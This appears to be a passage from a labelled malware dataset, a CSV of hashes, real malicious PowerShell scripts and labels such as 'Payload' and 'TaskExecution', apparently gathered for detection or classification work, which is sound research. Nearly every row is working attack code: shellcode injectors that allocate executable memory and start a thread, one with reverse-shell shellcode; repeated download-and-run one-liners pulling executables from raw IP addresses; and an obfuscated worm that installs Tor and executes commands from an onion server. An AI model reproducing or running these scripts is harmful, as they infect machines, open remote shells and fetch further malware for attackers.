0xb8,0x81,0xbb,0x87,0x88,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xeb,0xfc,0x03,0x43,0x8e,0x59,0x72,0x74,0x78,0x1f,0x7d,0x85,0x78,0x40,0xf7,0x60,0x49,0x40,0x63,0xe0,0xf9,0x70,0xe7,0xa4,0xf5,0xfb,0xa5,0x5c,0x8e,0x8e,0x61,0x52,0x27,0x24,0x54,0x5d,0xb8,0x15,0xa4,0xfc,0x3a,0x64,0xf9,0xde,0x03,0xa7,0x0c,0x1e,0x44,0xda,0xfd,0x72,0x1d,0x90,0x50,0x63,0x2a,0xec,0x68,0x08,0x60,0xe0,0xe8,0xed,0x30,0x03,0xd8,0xa3,0x4b,0x5a,0xfa,0x42,0x98,0xd6,0xb3,0x5c,0xfd,0xd3,0x0a,0xd6,0x35,0xaf,0x8c,0x3e,0x04,0x50,0x22,0x7f,0xa9,0xa3,0x3a,0x47,0x0d,0x5c,0x49,0xb1,0x6e,0xe1,0x4a,0x06,0x0d,0x3d,0xde,0x9d,0xb5,0xb6,0x78,0x7a,0x44,0x1a,0x1e,0x09,0x4a,0xd7,0x54,0x55,0x4e,0xe6,0xb9,0xed,0x6a,0x63,0x3c,0x22,0xfb,0x37,0x1b,0xe6,0xa0,0xec,0x02,0xbf,0x0c,0x42,0x3a,0xdf,0xef,0x3b,0x9e,0xab,0x1d,0x2f,0x93,0xf1,0x49,0x9c,0x9e,0x09,0x89,0x8a,0xa9,0x7a,0xbb,0x15,0x02,0x15,0xf7,0xde,0x8c,0xe2,0xf8,0xf4,0x69,0x7c,0x07,0xf7,0x89,0x54,0xc3,0xa3,0xd9,0xce,0xe2,0xcb,0xb1,0x0e,0x0b,0x1e,0x2f,0x0a,0x9b,0x0d,0xa0,0x05,0x0d,0x26,0xc3,0x25,0xb0,0x0d,0x4a,0xc3,0xe2,0x21,0x1d,0x5c,0x42,0x92,0xdd,0x0c,0x2a,0xf8,0xd1,0x73,0x4a,0x03,0x38,0x1c,0xe0,0xec,0x95,0x74,0x9c,0x95,0xbf,0x0f,0x3d,0x59,0x6a,0x6a,0x7d,0xd1,0x99,0x8a,0x33,0x12,0xd7,0x98,0xa3,0xd2,0xa2,0xc3,0x65,0xec,0x18,0x69,0x89,0x78,0xa7,0x38,0xde,0x14,0xa5,0x1d,0x28,0xbb,0x56,0x48,0x23,0x72,0xc3,0x33,0x5b,0x7b,0x03,0xb4,0x9b,0x2d,0x49,0xb4,0xf3,0x89,0x29,0xe7,0xe6,0xd5,0xe7,0x9b,0xbb,0x43,0x08,0xca,0x68,0xc3,0x60,0xf0,0x57,0x23,0x2f,0x0b,0xb2,0xb5,0x13,0xda,0xfa,0xc3,0x7d,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$3JQb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($3JQb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$3JQb,0,0,0);for (;;){Start-sleep 60};

",Payload
7994c439ef7aff97b1f3a575fc2b8c7b6944919c5bdba64da3f59dc48031c764,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xdd,0x68,0x19,0x6f,0xd9,0xcd,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x4b,0x31,0x57,0x15,0x03,0x57,0x15,0x83,0xc7,0x04,0xe2,0x28,0x94,0xf1,0xed,0xd2,0x65,0x02,0x92,0x5b,0x80,0x33,0x92,0x3f,0xc0,0x64,0x22,0x34,0x84,0x88,0xc9,0x18,0x3d,0x1a,0xbf,0xb4,0x32,0xab,0x0a,0xe2,0x7d,0x2c,0x26,0xd6,0x1c,0xae,0x35,0x0a,0xff,0x8f,0xf5,0x5f,0xfe,0xc8,0xe8,0xad,0x52,0x80,0x67,0x03,0x43,0xa5,0x32,0x9f,0xe8,0xf5,0xd3,0xa7,0x0d,0x4d,0xd5,0x86,0x83,0xc5,0x8c,0x08,0x25,0x09,0xa5,0x01,0x3d,0x4e,0x80,0xd8,0xb6,0xa4,0x7e,0xdb,0x1e,0xf5,0x7f,0x77,0x5f,0x39,0x72,0x86,0xa7,0xfe,0x6d,0xfd,0xd1,0xfc,0x10,0x05,0x26,0x7e,0xcf,0x80,0xbd,0xd8,0x84,0x32,0x1a,0xd8,0x49,0xa4,0xe9,0xd6,0x26,0xa3,0xb6,0xfa,0xb9,0x60,0xcd,0x07,0x31,0x87,0x02,0x8e,0x01,0xa3,0x86,0xca,0xd2,0xca,0x9f,0xb6,0xb5,0xf3,0xc0,0x18,0x69,0x51,0x8a,0xb5,0x7e,0xe8,0xd1,0xd1,0xb3,0xc0,0xe9,0x21,0xdc,0x53,0x99,0x13,0x43,0xcf,0x35,0x18,0x0c,0xc9,0xc2,0x5f,0x27,0xad,0x5d,0x9e,0xc8,0xcd,0x74,0x65,0x9c,0x9d,0xee,0x4c,0x9d,0x76,0xef,0x71,0x48,0xd8,0xbf,0xdd,0x23,0x98,0x6f,0x9e,0x93,0x70,0x7a,0x11,0xcb,0x60,0x85,0xfb,0x64,0x0a,0x7f,0x6c,0x4b,0x62,0x7e,0xa5,0x23,0x70,0x81,0x2a,0x2e,0xfd,0x67,0x3e,0x5e,0xab,0x30,0xd7,0xc7,0xf6,0xcb,0x46,0x07,0x2d,0xb6,0x49,0x83,0xc7,0x46,0x07,0x64,0xa2,0x54,0x70,0x4b,0x4c,0xa5,0x81,0xde,0x4c,0xcf,0x85,0x48,0x1b,0x67,0x84,0xad,0x6b,0x28,0x77,0x98,0xe8,0x2f,0x87,0x5d,0x07,0x44,0xbe,0xcb,0x97,0x33,0xbf,0x1b,0x17,0xc4,0xe9,0x71,0x17,0xac,0x4d,0x22,0x44,0xc9,0x91,0xff,0xf9,0x42,0x04,0x00,0xab,0x37,0x8f,0x68,0x51,0x61,0xe7,0x36,0xaa,0x44,0x7b,0x30,0x54,0x19,0xbf,0xc0,0x97,0xcc,0xf9,0xb6,0xfe,0xcc,0xbd,0xc9,0xb5,0x71,0x97,0x43,0xb5,0x26,0xe7,0x41;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9f63dba63fb40c6a292808e4a426a19e78719a5934400cd5bcdb57d2ee86b860,"
'lVBjWW';$ErrorActionPreference = 'SilentlyContinue';'jNQOAiMMkdR';'jmq';$wwo = (get-wmiobject Win32_ComputerSystemProduct).UUID;'SaRt';'ElFeXOtQjz';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $wwo){;'QaVdFFjj';'MtqBu';(Get-Process -id $pid).Kill();'cw';'ONBGZ';};'XXzyExPxFhY';'pMdSFKqrvLa';'ZbEKbSUh';'xjpZeYDv';function e($qza){;'bGaLALnMw';'ENxLTKdj';$orot = (((iex ""nslookup -querytype=txt $qza 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'ZuiAzZT';'In';$bp.DownloadFile($orot, $ai);'PRCLIFVQH';'cV';$fi = $fjx.NameSpace($ai).Items();'cmBlkiUW';'pJsbWflOAQ';$fjx.NameSpace($zui).CopyHere($fi, 20);'fLGzW';'qa';rd $ai;'ItpK';'gAcxQokjbdq';};'dfbWqLt';'pyiBJGPrs';'SHreDrqslGO';'bmXjlGkPNOW';'vLb';'tHZFGFEVS';$zui = $env:APPDATA + '\' + $wwo;'QFYaEbYU';'VybKxYISVV';if (!(Test-Path $zui)){;'lasxg';'WUdKHY';$jnj = New-Item -ItemType Directory -Force -Path $zui;'WSBNzrQWRp';'OmrLJSCcsb';$jnj.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'AVKt';'XzQSC';};'csPpLz';'GqA';'XUNcRs';'uadZs';$fkz=$zui+ '\tor.exe';'ctAUS';'ndDdWliZv';$szeo=$zui+ '\polipo.exe';'cC';'vMtZk';$ai=$zui+'\'+$wwo+'.zip';'krKyEjhs';'Jrixyw';$bp=New-Object System.Net.WebClient;'qgloHvfj';'kmNWBZwaAR';$fjx=New-Object -C Shell.Application;'XYLIkQ';'ZOUu';'YEJF';'NYC';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'HkuNDGZjxPN';'zNObipamCT';e 'i.vankin.de';'lcNRnsrLznG';'JeIDPkUPcaM';};'PccwMqmjIr';'Lcj';'RSdcbBdrW';'KtWZIdMo';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'eURPtEd';'qAoH';e 'gg.ibiz.cc';'CkjK';'HrLr';};'BDo';'dhVYRufO';'qTtR';'wWHNry';$wc=$zui+'\roaminglog';'xPQgK';'aFgl';saps $fkz -Ar "" --Log `""notice file $wc`"""" -wi Hidden;'sH';'qvkWgQFN';do{sleep 1;$ll=gc $wc}while(!($ll -match 'Bootstrapped 100%: Done.'));'JzJtwaoxod';'fmLibNDQXiT';saps $szeo -a ""socksParentProxy=localhost:9050"" -wi Hidden;'MMLB';'PB';sleep 7;'rmt';'UGYZoHaPrID';$lf=New-Object System.Net.WebProxy(""localhost:8123"");'mjeAqU';'HhVz';$lf.useDefaultCredentials = $true;'EowjlibIiiy';'Joz';$bp.proxy=$lf;'tQmlyxgSqL';'OPYAuEpisAz';$oxq='http://powerwormjqj42hu.onion/get.php?s=setup&uid=' + $wwo;'LcO';'YzTyALP';while(!$cl){$cl=$bp.downloadString($oxq)};'lMB';'FQQpJnA';if ($cl -ne 'none'){;'TKNTo';'IN';iex $cl;'PiM';'Jeylef';};'JiokKK';

",TaskExecution
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9352c3d5583f3b1522e62b82ac26d5018b8b9616fd0fefdc2de7cd6b913524db,"
$IMHt = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $IMHt -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xd8,0x81,0x5a,0x52,0xd9,0xc6,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0xd7,0x63,0xaf,0xae,0x0f,0xe1,0x50,0x4f,0xcf,0x86,0xd9,0xaa,0xfe,0x86,0xbe,0xbf,0x50,0x37,0xb4,0x92,0x5c,0xbc,0x98,0x06,0xd7,0xb0,0x34,0x28,0x50,0x7e,0x63,0x07,0x61,0xd3,0x57,0x06,0xe1,0x2e,0x84,0xe8,0xd8,0xe0,0xd9,0xe9,0x1d,0x1c,0x13,0xbb,0xf6,0x6a,0x86,0x2c,0x73,0x26,0x1b,0xc6,0xcf,0xa6,0x1b,0x3b,0x87,0xc9,0x0a,0xea,0x9c,0x93,0x8c,0x0c,0x71,0xa8,0x84,0x16,0x96,0x95,0x5f,0xac,0x6c,0x61,0x5e,0x64,0xbd,0x8a,0xcd,0x49,0x72,0x79,0x0f,0x8d,0xb4,0x62,0x7a,0xe7,0xc7,0x1f,0x7d,0x3c,0xba,0xfb,0x08,0xa7,0x1c,0x8f,0xab,0x03,0x9d,0x5c,0x2d,0xc7,0x91,0x29,0x39,0x8f,0xb5,0xac,0xee,0xbb,0xc1,0x25,0x11,0x6c,0x40,0x7d,0x36,0xa8,0x09,0x25,0x57,0xe9,0xf7,0x88,0x68,0xe9,0x58,0x74,0xcd,0x61,0x74,0x61,0x7c,0x28,0x10,0x46,0x4d,0xd3,0xe0,0xc0,0xc6,0xa0,0xd2,0x4f,0x7d,0x2f,0x5e,0x07,0x5b,0xa8,0xa1,0x32,0x1b,0x26,0x5c,0xbd,0x5c,0x6e,0x9a,0xe9,0x0c,0x18,0x0b,0x92,0xc6,0xd8,0xb4,0x47,0x72,0xdc,0x22,0x4c,0xcb,0xce,0x47,0xe4,0xc9,0xee,0xb6,0xa9,0x44,0x08,0xe8,0x01,0x07,0x85,0x48,0xf2,0xe7,0x75,0x20,0x18,0xe8,0xaa,0x50,0x23,0x22,0xc3,0xfa,0xcc,0x9b,0xbb,0x92,0x75,0x86,0x30,0x03,0x79,0x1c,0x3d,0x03,0xf1,0x93,0xc1,0xcd,0xf2,0xde,0xd1,0xb9,0xf2,0x94,0x88,0x6f,0x0c,0x03,0xa6,0x8f,0x98,0xa8,0x61,0xd8,0x34,0xb3,0x54,0x2e,0x9b,0x4c,0xb3,0x25,0x12,0xd9,0x7c,0x51,0x5b,0x0d,0x7d,0xa1,0x0d,0x47,0x7d,0xc9,0xe9,0x33,0x2e,0xec,0xf5,0xe9,0x42,0xbd,0x63,0x12,0x33,0x12,0x23,0x7a,0xb9,0x4d,0x03,0x25,0x42,0xb8,0x95,0x19,0x95,0x84,0xe3,0x73,0x25;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DjN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DjN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DjN,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c0c9d579ceffc7eb9bc8d92af0a4a1dc9dd75c4e91228b36d31898a8182f09f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7686e1803b770f4d6c364d3e0197fdba8bea50d986c968cb5c1b7fc5df6ed2b4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x58,0x4d,0xdb,0xc1,0xda,0xdb,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xef,0xfc,0x03,0x57,0x57,0xaf,0x2e,0x3d,0x8f,0xad,0xd1,0xbe,0x4f,0xd2,0x58,0x5b,0x7e,0xd2,0x3f,0x2f,0xd0,0xe2,0x34,0x7d,0xdc,0x89,0x19,0x96,0x57,0xff,0xb5,0x99,0xd0,0x4a,0xe0,0x94,0xe1,0xe7,0xd0,0xb7,0x61,0xfa,0x04,0x18,0x58,0x35,0x59,0x59,0x9d,0x28,0x90,0x0b,0x76,0x26,0x07,0xbc,0xf3,0x72,0x94,0x37,0x4f,0x92,0x9c,0xa4,0x07,0x95,0x8d,0x7a,0x1c,0xcc,0x0d,0x7c,0xf1,0x64,0x04,0x66,0x16,0x40,0xde,0x1d,0xec,0x3e,0xe1,0xf7,0x3d,0xbe,0x4e,0x36,0xf2,0x4d,0x8e,0x7e,0x34,0xae,0xe5,0x76,0x47,0x53,0xfe,0x4c,0x3a,0x8f,0x8b,0x56,0x9c,0x44,0x2b,0xb3,0x1d,0x88,0xaa,0x30,0x11,0x65,0xb8,0x1f,0x35,0x78,0x6d,0x14,0x41,0xf1,0x90,0xfb,0xc0,0x41,0xb7,0xdf,0x89,0x12,0xd6,0x46,0x77,0xf4,0xe7,0x99,0xd8,0xa9,0x4d,0xd1,0xf4,0xbe,0xff,0xb8,0x90,0x73,0x32,0x43,0x60,0x1c,0x45,0x30,0x52,0x83,0xfd,0xde,0xde,0x4c,0xd8,0x19,0x21,0x67,0x9c,0xb6,0xdc,0x88,0xdd,0x9f,0x1a,0xdc,0x8d,0xb7,0x8b,0x5d,0x46,0x48,0x34,0x88,0xc9,0x18,0x9a,0x63,0xaa,0xc8,0x5a,0xd4,0x42,0x03,0x55,0x0b,0x72,0x2c,0xbc,0x24,0x19,0xd6,0x56,0x8b,0x76,0xd9,0xa5,0x63,0x85,0xda,0xb8,0x2f,0x00,0x3c,0xd0,0xdf,0x44,0x96,0x4c,0x79,0xcd,0x6c,0xed,0x86,0xdb,0x08,0x2d,0x0c,0xe8,0xed,0xe3,0xe5,0x85,0xfd,0x93,0x05,0xd0,0x5c,0x35,0x19,0xce,0xcb,0xb9,0x8f,0xf5,0x5d,0xee,0x27,0xf4,0xb8,0xd8,0xe7,0x07,0xef,0x53,0x21,0x92,0x50,0x0b,0x4e,0x72,0x51,0xcb,0x18,0x18,0x51,0xa3,0xfc,0x78,0x02,0xd6,0x02,0x55,0x36,0x4b,0x97,0x56,0x6f,0x38,0x30,0x3f,0x8d,0x67,0x76,0xe0,0x6e,0x42,0x86,0xdc,0xb8,0xaa,0xfc,0x0c,0x79;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c801786f584f0df5023ce939384f4df67439e5b72ed95808580b94bc8d898bcb,"
(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'

",Payload
ba854bbeea607a04c07a4d0e900692c495771cdb8f299bade0728fa592b637a3,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = ;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
86284def33fc9ff9c25bd16c9564867ad2cd8ff349692d98d0c8c4c646b80d70,"
$Gn4 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Gn4 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 